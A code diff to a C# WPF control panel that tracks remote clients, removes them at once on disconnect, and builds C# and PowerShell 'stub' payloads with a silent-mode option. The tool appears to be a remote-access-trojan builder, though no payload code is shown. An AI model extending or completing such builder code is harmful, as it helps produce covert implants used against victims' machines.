@@ -88,7 +88,7 @@ namespace WpfApp
 
         // Grace period before removing a disconnected client from UI
         private readonly ConcurrentDictionary<string, DateTime> _disconnectGracePeriod = new();
-        private static readonly TimeSpan DisconnectGrace = TimeSpan.FromSeconds(30);
+        private static readonly TimeSpan DisconnectGrace = TimeSpan.Zero;
         private static readonly TimeSpan ClientTimeout = TimeSpan.FromSeconds(120);
 
         // When true, all incoming client registrations and disconnections are ignored
@@ -2386,7 +2386,10 @@ namespace WpfApp
             if (!_disconnectGracePeriod.ContainsKey(displayId))
             {
                 _disconnectGracePeriod[displayId] = DateTime.UtcNow;
-                AppendLog($"Client disconnected: '{displayId}' — grace period started ({DisconnectGrace.TotalSeconds}s).");
+                RemoveClientTracking(displayId);
+                RemoveClientUI(displayId);
+                _ = (_pluginHost?.OnClientDisconnected(displayId) ?? Task.CompletedTask);
+                RemovePluginTabsForClient(displayId);
             }
         }
 
@@ -2726,7 +2729,7 @@ namespace WpfApp
 
             bool silentMode = builderSilentCheckBox?.IsChecked == true;
 
-            string stubCode = LoadStubTemplate("Stubs/CSharpStub/Stub.cs");
+            string stubCode = LoadStubTemplate("CSharpStub/Stub.cs");
             if (string.IsNullOrEmpty(stubCode))
             {
                 AppendLog("ERROR: C# stub template not found.");
@@ -2797,9 +2800,9 @@ namespace WpfApp
         {
             string content;
 
-            string templatePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Stubs", "PSStub", "PSStub_Direct.ps1");
+            string templatePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PSStub", "PSStub_Direct.ps1");
 
-            content = LoadStubTemplate("Stubs/PSStub/PSStub_Direct.ps1");
+            content = LoadStubTemplate("PSStub/PSStub_Direct.ps1");
             if (string.IsNullOrEmpty(content))
             {
                 AppendLog("ERROR: PowerShell stub template not found.");
@@ -2901,9 +2904,6 @@ namespace WpfApp
     <AppendTargetFrameworkToOutputPath>false</AppendTargetFrameworkToOutputPath>
     <AppendRuntimeIdentifierToOutputPath>false</AppendRuntimeIdentifierToOutputPath>
   </PropertyGroup>
-  <ItemGroup>
-    <Reference Include=""System.Management"" />
-  </ItemGroup>
 </Project>";
 
                     string csprojPath = Path.Combine(buildDir, "Stub.csproj");
